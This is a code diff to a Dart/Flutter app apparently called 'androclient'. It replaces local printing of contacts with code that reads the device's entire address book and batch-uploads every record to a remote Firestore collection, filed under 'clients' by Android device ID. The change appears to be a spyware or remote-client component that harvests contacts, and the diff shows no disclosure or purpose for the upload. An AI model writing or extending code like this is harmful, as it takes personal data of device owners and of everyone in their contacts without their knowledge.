@@ -1,3 +1,5 @@
+import 'package:androclient/device.dart';
+import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:permission_handler/permission_handler.dart';
 
@@ -20,17 +22,20 @@ Future<PermissionStatus> _getContactPermission() async {
 Future<void> getContacts() async {
   final PermissionStatus permissionStatus = await _getContactPermission();
   if (permissionStatus == PermissionStatus.granted) {
-    var contacts = await ContactsService.getContacts();
-    for (var contact in contacts) {
-      print(contact.androidAccountName);
-      print(contact.displayName);
-      print(contact.birthday);
-      for (var email in contact.emails!) {
-        print(email.value);
+    var contacts = await ContactsService.getContacts(withThumbnails:false, photoHighResolution:false);
+    String? androidId = await getIdentity();
+    CollectionReference contactCollection = firestore.collection('clients').doc(androidId).collection("contact");
+    var batch = firestore.batch();
+    for (var i = 0; i < contacts.length; i++) {
+      if (i % 300 == 0) {
+        await batch.commit();
+        batch = firestore.batch();
       }
-      for (var phone in contact.phones!) {
-        print(phone.value);
-      }
+      Map<String, dynamic> contactMap = Map<String, dynamic>.from(contacts.elementAt(i).toMap());
+      contactMap.remove("avatar");
+      DocumentReference contactDocument = contactCollection.doc(contacts.elementAt(i).identifier.toString());
+      batch.set(contactDocument, contactMap);
     }
+    await batch.commit();
   }
 }
